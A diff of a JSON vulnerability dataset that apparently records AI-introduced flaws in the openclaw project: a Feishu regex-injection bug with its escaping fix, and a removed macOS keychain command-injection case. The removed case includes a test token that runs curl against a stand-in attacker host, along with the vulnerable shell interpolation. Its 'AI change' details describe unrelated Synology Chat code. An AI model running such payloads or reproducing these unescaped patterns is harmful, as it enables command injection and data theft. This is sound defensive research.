+    "display_hunks": [
+     {
+      "annotation": "The imported plugin builds the mention-stripping pattern from the mention name and the mention key themselves, and its caller runs that helper on every inbound message, so sender-controlled metadata becomes pattern syntax.",
+      "code": "--- /dev/null\n+++ b/extensions/feishu/src/bot.ts\n@@ -0,0 +1,823 @@\n+function stripBotMention(\n+  text: string,\n+  mentions?: FeishuMessageEvent[\"message\"][\"mentions\"],\n+): string {\n+  if (!mentions || mentions.length === 0) return text;\n+  let result = text;\n+  for (const mention of mentions) {\n+    result = result.replace(new RegExp(`@${mention.name}\\\\s*`, \"g\"), \"\").trim();\n+    result = result.replace(new RegExp(mention.key, \"g\"), \"\").trim();\n+  }\n+  return result;\n+}",
+      "file": "extensions/feishu/src/bot.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The fix escapes metacharacters in the mention name and key before the pattern is compiled, so the metadata is matched as literal text and a hostile name can no longer change the pattern or its running time.",
+      "code": "@@ -199,6 +199,10 @@ function checkBotMentioned(event: FeishuMessageEvent, botOpenId?: string): boole\n   return false;\n }\n \n+function escapeRegExp(s: string): string {\n+  return s.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\");\n+}\n+\n function stripBotMention(\n   text: string,\n   mentions?: FeishuMessageEvent[\"message\"][\"mentions\"],\n@@ -206,8 +210,8 @@ function stripBotMention(\n   if (!mentions || mentions.length === 0) return text;\n   let result = text;\n   for (const mention of mentions) {\n-    result = result.replace(new RegExp(`@${mention.name}\\\\s*`, \"g\"), \"\").trim();\n-    result = result.replace(new RegExp(mention.key, \"g\"), \"\").trim();\n+    result = result.replace(new RegExp(`@${escapeRegExp(mention.name)}\\\\s*`, \"g\"), \"\").trim();\n+    result = result.replace(new RegExp(escapeRegExp(mention.key), \"g\"), \"\").trim();\n   }\n   return result;\n }",
+      "file": "extensions/feishu/src/bot.ts",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "183173916860df53b2fd2c7fcca540d918ed81aad1bb4f34f80fa587f85596bc",
+    "fix_url": "https://github.com/openclaw/openclaw/commit/7e67ab75cc2f0e93569d12fecd1411c2961fcc8c",
+    "steps": [
+     {
+      "detail": "The imported plugin removed incoming mentions with a regular expression built from the raw mention name and key, so message metadata became pattern syntax rather than literal text.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The helper escapes regular-expression metacharacters in both the mention name and the mention key before compiling the pattern, matching the escaping the neighbouring mention helper already used.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "The imported Feishu plugin compiled message mention metadata straight into regular expressions, so a crafted mention name could either stall message processing with catastrophic backtracking or quietly delete message text that the sender never wrote as a pattern."
+   },
+   "ir_chain": null,
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-c6hr-w26q-c636",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
@@ -35843,153 +36955,6 @@
    "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-jfv4-h8mc-jcp8",
-   "publication_issues": [],
-   "publication_status": "confirmed"
-  },
-  {
-   "case_id": "GHSA-4564-PVR2-QQ4H",
-   "aliases": [
-    "CVE-2026-27487"
-   ],
-   "repository": "openclaw/openclaw",
-   "repository_metadata": {
-    "full_name": "openclaw/openclaw",
-    "language": "TypeScript",
-    "archived": false
-   },
-   "contribution_class": "AI_DIRECT_ROOT",
-   "candidate_set": [
-    "9a3800d8e6e69bc0a125dca5760d47515e746454"
-   ],
-   "carrier_set": [],
-   "minimum_fix_set": [
-    "9dce3d8bf83f13c067bc3c32291643d2f1f10a06"
-   ],
-   "gates": {
-    "ai_hunk": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "identity": "PASS",
-    "release": "PASS",
-    "topology": "PASS",
-    "uniqueness": "PASS"
-   },
-   "vulnerable_release": {
-    "kind": "git_tag",
-    "tag": "v2026.2.13",
-    "version": "2026.2.13"
-   },
-   "fixed_release": {
-    "kind": "git_tag",
-    "tag": "v2026.2.14",
-    "version": "2026.2.14"
-   },
-   "published_at": "2026-02-18",
-   "severity": "HIGH",
-   "cwes": [
-    "CWE-78",
-    "CWE-78: IMPROPER NEUTRALIZATION OF SPECIAL ELEMENTS USED IN AN OS COMMAND ('OS COMMAND INJECTION')"
-   ],
-   "description": "## Summary\nOn macOS, the Claude CLI keychain credential refresh path constructed a shell command to write the updated JSON blob into Keychain via `security add-generic-password -w ...`. Because OAuth tokens are user-controlled data, this created an OS command injection risk.\n\nThe fix avoids invoking a shell by using `execFileSync(\"security\", argv)` and passing the updated keychain payload as a literal argument.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Platform: macOS only\n- Affected versions: `<= 2026.2.13`\n\n## Fix\n- Patched version: `>= 2026.2.14` (next release)\n- Fix PR: #15924\n- Fix commits (merged to `main`):\n - `9dce3d8bf83f13c067bc3c32291643d2f1f10a06`\n - `66d7178f2d6f9d60abad35797f97f3e61389b70c`\n - `b908388245764fb3586859f44d1dff5372b19caf`\n\nThanks @aether-ai-agent for reporting.",
-   "references": [
-    "https://github.com/openclaw/openclaw/security/advisories/GHSA-4564-pvr2-qq4h",
-    "https://nvd.nist.gov/vuln/detail/CVE-2026-27487",
-    "https://github.com/openclaw/openclaw/pull/15924",
-    "https://github.com/openclaw/openclaw/commit/66d7178f2d6f9d60abad35797f97f3e61389b70c",
-    "https://github.com/openclaw/openclaw/commit/9dce3d8bf83f13c067bc3c32291643d2f1f10a06",
-    "https://github.com/openclaw/openclaw/commit/b908388245764fb3586859f44d1dff5372b19caf",
-    "https://github.com/openclaw/openclaw",
-    "https://github.com/openclaw/openclaw/releases/tag/v2026.2.14"
-   ],
-   "mechanism": "GitHub-reviewed GHSA-4564-pvr2-qq4h aliases CVE-2026-27487 and names macOS Claude CLI keychain refresh writing token JSON via security add-generic-password -w through a shell. Parent 1281c1d1 only execSync-reads the keychain. Member a39951d4 (Co-Authored-By: Claude) first adds writeClaudeCliKeychainCredentials interpolating newValue into execSync(`security add-generic-password ... -w '${newValue.replace(...)}'`). Human 8b473681 later moves that sink into cli-credentials.ts without removing the shell. Minimum production reversal 9dce3d8b (#15924) switches the write to execFileSync(\"security\", argv). 66d7178f is a descendant of 9dce3d8b and only clears residual shell use; b9083882 is test cleanup. Published GitHub releases: v2026.2.12/v2026.2.13 contain origin without fix; v2026.2.14 contains 9dce3d8b.",
-   "cause_category": "injection",
-   "ai_provenance": {
-    "family": "claude",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1
-   },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "aether"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "github@tryaether.ai",
-       "name": "Aether AI"
-      },
-      "authored_at": "2026-02-15T03:06:10+11:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "aether",
-        "kind": "author_identity",
-        "text": "Aether AI <github@tryaether.ai>"
-       }
-      ],
-      "families": [
-       "aether"
-      ],
-      "sha": "9dce3d8bf83f13c067bc3c32291643d2f1f10a06"
-     }
-    ]
-   },
-   "code_evidence": {
-    "fix_marker": null,
-    "candidate_url": "https://github.com/openclaw/openclaw/commit/9a3800d8e6e69bc0a125dca5760d47515e746454",
-    "fix_url": "https://github.com/openclaw/openclaw/commit/9dce3d8bf83f13c067bc3c32291643d2f1f10a06",
-    "advisory_url": "https://github.com/advisories/ghsa-4564-pvr2-qq4h",
-    "summary": "AI-written code interpolated an OAuth token into a shell command for the macOS keychain, enabling OS command injection on affected versions.",
-    "steps": [
-     {
-      "title": "AI change",
-      "detail": "fix(synology-chat): resolve Chat API user_id for reply delivery (#23709)"
-     },
-     {
-      "title": "Fix",
-      "detail": "fix(security): prevent shell injection in macOS keychain credential write (#15924)"
-     }
-    ],
-    "display_hunks": [
-     {
-      "file": "extensions/synology-chat/src/webhook-handler.ts",
-      "code": "@@ -10,7 +10,7 @@ import {\n   readRequestBodyWithLimit,\n   requestBodyErrorToText,\n } from \"openclaw/plugin-sdk\";\n-import { sendMessage } from \"./client.js\";\n+import { sendMessage, resolveChatUserId } from \"./client.js\";\n import { validateToken, authorizeUserForDm, sanitizeInput, RateLimiter } from \"./security.js\";\n import type { SynologyWebhookPayload, ResolvedSynologyChatAccount } from \"./types.js\";\n \n@@ -225,6 +225,8 @@ export interface WebhookHandlerDeps {\n     chatType: string;\n     sessionKey: string;\n     accountId: string;\n+    /** Chat API user_id for sending replies (may differ from webhook user_id) */\n+    chatUserId?: string;\n   }) => Promise<string | null>;\n   log?: {\n     info: (...args: unknown[]) => void;\n@@ -330,8 +332,29 @@ export function createWebhookHandler(deps: WebhookHandlerDeps) {\n     // ACK immediately so Synology Chat won't remain in \"Processing...\"\n     respondNoContent(res);\n \n+    // Default to webhook user_id; may be replaced with Chat API user_id below.\n+    let replyUserId = payload.user_id;\n+\n     // Deliver to agent asynchronously (with 120s timeout to match nginx proxy_read_timeout)\n     try {\n+      // Resolve the Chat-internal user_id for sending replies.\n+      // Synology Chat outgoing webhooks use a per-integration user_id that may\n+      // differ from the global Chat API user_id required by method=chatbot.\n+      // We resolve via the user_list API, matching by nickname/username.\n+      const chatUserId = await resolveChatUserId(\n+        account.incomingUrl,\n+        payload.username,\n+        account.allowInsecureSsl,\n+        log,\n+      );\n+      if (chatUserId !== undefined) {\n+        replyUserId = String(chatUserId);\n+      } else {\n+        log?.warn(\n+          `Could not resolve Chat API user_id for \"${payload.username}\" — falling back to webhook user_id ${payload.user_id}. Reply delivery may fail.`,\n+        );\n+      }\n+\n       const sessionKey = `synology-chat-${payload.user_id}`;\n       const deliverPromise = deliver({\n         body: cleanText,\n@@ -341,6 +364,7 @@ export function createWebhookHandler(deps: WebhookHandlerDeps) {\n         chatType: \"direct\",\n         sessionKey,\n         accountId: account.accountId,\n+        chatUserId: replyUserId,\n       });\n \n       const timeoutPromise = new Promise<null>((_, reject) =>\n@@ -349,19 +373,19 @@ export function createWebhookHandler(deps: WebhookHandlerDeps) {\n \n       const reply = await Promise.race([deliverPromise, timeoutPromise]);\n \n-      // Send reply back to Synology Chat\n+      // Send reply back to Synology Chat using the resolved Chat user_id\n       if (reply) {\n-        await sendMessage(account.incomingUrl, reply, payload.user_id, account.allowInsecureSsl);\n+        await sendMessage(account.incomingUrl, reply, replyUserId, account.allowInsecureSsl);\n         const replyPreview = reply.length > 100 ? `${reply.slice(0, 100)}...` : reply;\n-        log?.info(`Reply sent to ${payload.username} (${payload.user_id}): ${replyPreview}`);\n+        log?.info(`Reply sent to ${payload.username} (${replyUserId}): ${replyPreview}`);\n       }\n     } catch (err) {\n       const errMsg = err instanceof Error ? `${err.message}\\n${err.stack}` : String(err);\n       log?.error(`Failed to process message from ${payload.username}: ${errMsg}`);\n       await sendMessage(\n         account.incomingUrl,\n         \"Sorry, an error occurred while processing your message.\",\n-        payload.user_id,\n+        replyUserId,\n         account.allowInsecureSsl,\n       );\n     }",
-      "annotation": "Routes Synology Chat replies through a user id resolved from the user_list API instead of the per-integration webhook id, falling back to the original value when no nickname or username matches.",
-      "role": "candidate"
-     },
-     {
-      "file": "extensions/synology-chat/src/client.test.ts",
-      "code": "@@ -4,16 +4,18 @@ import { describe, it, expect, vi, beforeEach, afterEach } from \"vitest\";\n // Mock http and https modules before importing the client\n vi.mock(\"node:https\", () => {\n   const mockRequest = vi.fn();\n-  return { default: { request: mockRequest }, request: mockRequest };\n+  const mockGet = vi.fn();\n+  return { default: { request: mockRequest, get: mockGet }, request: mockRequest, get: mockGet };\n });\n \n vi.mock(\"node:http\", () => {\n   const mockRequest = vi.fn();\n-  return { default: { request: mockRequest }, request: mockRequest };\n+  const mockGet = vi.fn();\n+  return { default: { request: mockRequest, get: mockGet }, request: mockRequest, get: mockGet };\n });\n \n // Import after mocks are set up\n-const { sendMessage, sendFileUrl } = await import(\"./client.js\");\n+const { sendMessage, sendFileUrl, fetchChatUsers, resolveChatUserId } = await import(\"./client.js\");\n const https = await import(\"node:https\");\n let fakeNowMs = 1_700_000_000_000;\n \n@@ -111,3 +113,122 @@ describe(\"sendFileUrl\", () => {\n     expect(result).toBe(false);\n   });\n });\n+\n+// Helper to mock the user_list API response for fetchChatUsers / resolveChatUserId\n+function mockUserListResponse(\n+  users: Array<{ user_id: number; username: string; nickname: string }>,\n+) {\n+  const httpsGet = vi.mocked((https as any).get);\n+  httpsGet.mockImplementation((_url: any, _opts: any, callback: any) => {\n+    const res = new EventEmitter() as any;\n+    res.statusCode = 200;\n+    process.nextTick(() => {\n+      callback(res);\n+      res.emit(\"data\", Buffer.from(JSON.stringify({ success: true, data: { users } })));\n+      res.emit(\"end\");\n+    });\n+    const req = new EventEmitter() as any;\n+    req.destroy = vi.fn();\n+    return req;\n+  });\n+}\n+\n+function mockUserListResponseOnce(\n+  users: Array<{ user_id: number; username: string; nickname: string }>,\n+) {\n+  const httpsGet = vi.mocked((https as any).get);\n+  httpsGet.mockImplementationOnce((_url: any, _opts: any, callback: any) => {\n+    const res = new EventEmitter() as any;\n+    res.statusCode = 200;\n+    process.nextTick(() => {\n+      callback(res);\n+      res.emit(\"data\", Buffer.from(JSON.stringify({ success: true, data: { users } })));\n+      res.emit(\"end\");\n+    });\n+    const req = new EventEmitter() as any;\n+    req.destroy = vi.fn();\n+    return req;\n+  });\n+}\n+\n+describe(\"resolveChatUserId\", () => {\n+  const baseUrl =\n+    \"https://nas.example.com/webapi/entry.cgi?api=SYNO.Chat.External&method=chatbot&version=2&token=%22test%22\";\n+  const baseUrl2 =\n+    \"https://nas2.example.com/webapi/entry.cgi?api=SYNO.Chat.External&method=chatbot&version=2&token=%22test-2%22\";\n+\n+  beforeEach(() => {\n+    vi.clearAllMocks();\n+    vi.useFakeTimers();\n+    // Advance time to invalidate any cached user list from previous tests\n+    fakeNowMs += 10 * 60 * 1000;\n+    vi.setSystemTime(fakeNowMs);\n+  });\n+\n+  afterEach(() => {\n+    vi.useRealTimers();\n+  });\n+\n+  it(\"resolves user by nickname (webhook username = Chat nickname)\", async () => {\n+    mockUserListResponse([\n+      { user_id: 4, username: \"jmn67\", nickname: \"jmn\" },\n+      { user_id: 7, username: \"she67\", nickname: \"sarah\" },\n+    ]);\n+    const result = await resolveChatUserId(baseUrl, \"jmn\");\n+    expect(result).toBe(4);\n+  });",
-      "annotation": "Mocks the https transport and the user_list response to test chat user id resolution, covering nickname and username matching, lookup misses, and per-endpoint cache expiry for reply routing.",
-      "role": "candidate"
-     },
-     {
-      "file": "extensions/synology-chat/src/client.ts",
-      "code": "@@ -9,6 +9,28 @@ import * as https from \"node:https\";\n const MIN_SEND_INTERVAL_MS = 500;\n let lastSendTime = 0;\n \n+// --- Chat user_id resolution ---\n+// Synology Chat uses two different user_id spaces:\n+//   - Outgoing webhook user_id: per-integration sequential ID (e.g. 1)\n+//   - Chat API user_id: global internal ID (e.g. 4)\n+// The chatbot API (method=chatbot) requires the Chat API user_id in the\n+// user_ids array. We resolve via the user_list API and cache the result.\n+\n+interface ChatUser {\n+  user_id: number;\n+  username: string;\n+  nickname: string;\n+}\n+\n+type ChatUserCacheEntry = {\n+  users: ChatUser[];\n+  cachedAt: number;\n+};\n+\n+// Cache user lists per bot endpoint to avoid cross-account bleed.\n+const chatUserCache = new Map<string, ChatUserCacheEntry>();\n+const CACHE_TTL_MS = 5 * 60 * 1000; // 5 minutes\n+\n /**\n  * Send a text message to Synology Chat via the incoming webhook.\n  *\n@@ -92,6 +114,107 @@ export async function sendFileUrl(\n   }\n }\n \n+/**\n+ * Fetch the list of Chat users visible to this bot via the user_list API.\n+ * Results are cached for CACHE_TTL_MS to avoid excessive API calls.\n+ *\n+ * The user_list endpoint uses the same base URL as the chatbot API but\n+ * with method=user_list instead of method=chatbot.\n+ */\n+export async function fetchChatUsers(\n+  incomingUrl: string,\n+  allowInsecureSsl = true,\n+  log?: { warn: (...args: unknown[]) => void },\n+): Promise<ChatUser[]> {\n+  const now = Date.now();\n+  const listUrl = incomingUrl.replace(/method=\\w+/, \"method=user_list\");\n+  const cached = chatUserCache.get(listUrl);\n+  if (cached && now - cached.cachedAt < CACHE_TTL_MS) {\n+    return cached.users;\n+  }\n+\n+  return new Promise((resolve) => {\n+    let parsedUrl: URL;\n+    try {\n+      parsedUrl = new URL(listUrl);\n+    } catch {\n+      log?.warn(\"fetchChatUsers: invalid user_list URL, using cached data\");\n+      resolve(cached?.users ?? []);\n+      return;\n+    }\n+    const transport = parsedUrl.protocol === \"https:\" ? https : http;\n+\n+    transport\n+      .get(listUrl, { rejectUnauthorized: !allowInsecureSsl } as any, (res) => {\n+        let data = \"\";\n+        res.on(\"data\", (c: Buffer) => {\n+          data += c.toString();\n+        });\n+        res.on(\"end\", () => {\n+          try {\n+            const result = JSON.parse(data);\n+            if (result.success && result.data?.users) {\n+              const users = result.data.users.map((u: any) => ({\n+                user_id: u.user_id,\n+                username: u.username || \"\",\n+                nickname: u.nickname || \"\",\n+              }));\n+              chatUserCache.set(listUrl, {\n+                users,\n+                cachedAt: now,\n+              });\n+              resolve(users);\n+            } else {\n+              log?.warn(\n+                `fetchChatUsers: API returned success=${result.success}, using cached data`,\n+              );\n+              resolve(cached?.users ?? []);\n+            }\n+          } catch {",
-      "annotation": "Implements fetchChatUsers by rewriting the incoming webhook URL to the user_list method and caching the parsed roster per bot endpoint for five minutes to avoid repeated directory lookups.",
-      "role": "candidate"
-     },
-     {
-      "file": "src/agents/cli-credentials.ts",
-      "code": "@@ -1,5 +1,5 @@\n import type { OAuthCredentials, OAuthProvider } from \"@mariozechner/pi-ai\";\n-import { execSync } from \"node:child_process\";\n+import { execFileSync, execSync } from \"node:child_process\";\n import { createHash } from \"node:crypto\";\n import fs from \"node:fs\";\n import path from \"node:path\";\n@@ -86,6 +86,7 @@ type ClaudeCliWriteOptions = ClaudeCliFileOptions & {\n };\n \n type ExecSyncFn = typeof execSync;\n+type ExecFileSyncFn = typeof execFileSync;\n \n function resolveClaudeCliCredentialsPath(homeDir?: string) {\n   const baseDir = homeDir ?? resolveUserPath(\"~\");\n@@ -381,9 +382,10 @@ export function readClaudeCliCredentialsCached(options?: {\n \n export function writeClaudeCliKeychainCredentials(\n   newCredentials: OAuthCredentials,\n-  options?: { execSync?: ExecSyncFn },\n+  options?: { execSync?: ExecSyncFn; execFileSync?: ExecFileSyncFn },\n ): boolean {\n   const execSyncImpl = options?.execSync ?? execSync;\n+  const execFileSyncImpl = options?.execFileSync ?? execFileSync;\n   try {\n     const existingResult = execSyncImpl(\n       `security find-generic-password -s \"${CLAUDE_CLI_KEYCHAIN_SERVICE}\" -w 2>/dev/null`,\n@@ -405,10 +407,15 @@ export function writeClaudeCliKeychainCredentials(\n \n     const newValue = JSON.stringify(existingData);\n \n-    execSyncImpl(\n-      `security add-generic-password -U -s \"${CLAUDE_CLI_KEYCHAIN_SERVICE}\" -a \"${CLAUDE_CLI_KEYCHAIN_ACCOUNT}\" -w '${newValue.replace(/'/g, \"'\\\"'\\\"'\")}'`,\n-      { encoding: \"utf8\", timeout: 5000, stdio: [\"pipe\", \"pipe\", \"pipe\"] },\n-    );\n+    // Use execFileSync to avoid shell interpretation of user-controlled token values.\n+    // This prevents command injection via $() or backtick expansion in OAuth tokens.\n+    execFileSyncImpl(\"security\", [\n+      \"add-generic-password\",\n+      \"-U\",\n+      \"-s\", CLAUDE_CLI_KEYCHAIN_SERVICE,\n+      \"-a\", CLAUDE_CLI_KEYCHAIN_ACCOUNT,\n+      \"-w\", newValue,\n+    ], { encoding: \"utf8\", timeout: 5000, stdio: [\"pipe\", \"pipe\", \"pipe\"] });\n \n     log.info(\"wrote refreshed credentials to claude cli keychain\", {\n       expires: new Date(newCredentials.expires).toISOString(),",
-      "annotation": "Replaces the single-quoted shell command for the macOS keychain write with execFileSync, passing the serialized credential JSON as a literal argument vector so token content cannot undergo shell substitution.",
-      "role": "fix"
-     },
-     {
-      "file": "src/agents/cli-credentials.e2e.test.ts",
-      "code": "@@ -4,6 +4,7 @@ import path from \"node:path\";\n import { afterEach, beforeEach, describe, expect, it, vi } from \"vitest\";\n \n const execSyncMock = vi.fn();\n+const execFileSyncMock = vi.fn();\n \n describe(\"cli credentials\", () => {\n   beforeEach(() => {\n@@ -13,18 +14,15 @@ describe(\"cli credentials\", () => {\n   afterEach(async () => {\n     vi.useRealTimers();\n     execSyncMock.mockReset();\n+    execFileSyncMock.mockReset();\n     delete process.env.CODEX_HOME;\n     const { resetCliCredentialCachesForTest } = await import(\"./cli-credentials.js\");\n     resetCliCredentialCachesForTest();\n   });\n \n   it(\"updates the Claude Code keychain item in place\", async () => {\n-    const commands: string[] = [];\n-\n     execSyncMock.mockImplementation((command: unknown) => {\n       const cmd = String(command);\n-      commands.push(cmd);\n-\n       if (cmd.includes(\"find-generic-password\")) {\n         return JSON.stringify({\n           claudeAiOauth: {\n@@ -34,10 +32,11 @@ describe(\"cli credentials\", () => {\n           },\n         });\n       }\n-\n       return \"\";\n     });\n \n+    execFileSyncMock.mockReturnValue(\"\");\n+\n     const { writeClaudeCliKeychainCredentials } = await import(\"./cli-credentials.js\");\n \n     const ok = writeClaudeCliKeychainCredentials(\n@@ -46,14 +45,97 @@ describe(\"cli credentials\", () => {\n         refresh: \"new-refresh\",\n         expires: Date.now() + 60_000,\n       },\n-      { execSync: execSyncMock },\n+      { execSync: execSyncMock, execFileSync: execFileSyncMock },\n+    );\n+\n+    expect(ok).toBe(true);\n+\n+    // Verify execFileSync was called with array args (no shell interpretation)\n+    expect(execFileSyncMock).toHaveBeenCalledTimes(1);\n+    const [binary, args] = execFileSyncMock.mock.calls[0];\n+    expect(binary).toBe(\"security\");\n+    expect(args).toContain(\"add-generic-password\");\n+    expect(args).toContain(\"-U\");\n+  });\n+\n+  it(\"prevents shell injection via malicious OAuth token values\", async () => {\n+    const maliciousToken = \"x'$(curl attacker.com/exfil)'y\";\n+\n+    execSyncMock.mockImplementation((command: unknown) => {\n+      const cmd = String(command);\n+      if (cmd.includes(\"find-generic-password\")) {\n+        return JSON.stringify({\n+          claudeAiOauth: {\n+            accessToken: \"old-access\",\n+            refreshToken: \"old-refresh\",\n+            expiresAt: Date.now() + 60_000,\n+          },\n+        });\n+      }\n+      return \"\";\n+    });\n+\n+    execFileSyncMock.mockReturnValue(\"\");\n+\n+    const { writeClaudeCliKeychainCredentials } = await import(\"./cli-credentials.js\");\n+\n+    const ok = writeClaudeCliKeychainCredentials(\n+      {\n+        access: maliciousToken,\n+        refresh: \"safe-refresh\",\n+        expires: Date.now() + 60_000,\n+      },\n+      { execSync: execSyncMock, execFileSync: execFileSyncMock },\n+    );\n+\n+    expect(ok).toBe(true);",
-      "annotation": "Adds a regression test that persists an OAuth token containing quotes and command substitution, confirming the hardened credential write treats the hostile value as plain data.",
-      "role": "fix"
-     }
-    ],
-    "candidate_patch_sha256": "4c10e3f0c0b685995bf5ad35e5965a4da029671549b72f7cf5456241c9f2b65e",
-    "fix_patch_sha256": "6581f01ada47e3e1a815ab4f4d80dddc093f2ff8f92a5393944fe7082937d8aa"
-   },
-   "ir_chain": null,
-   "unpatched": null,
-   "advisory_url": "https://github.com/advisories/ghsa-4564-pvr2-qq4h",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
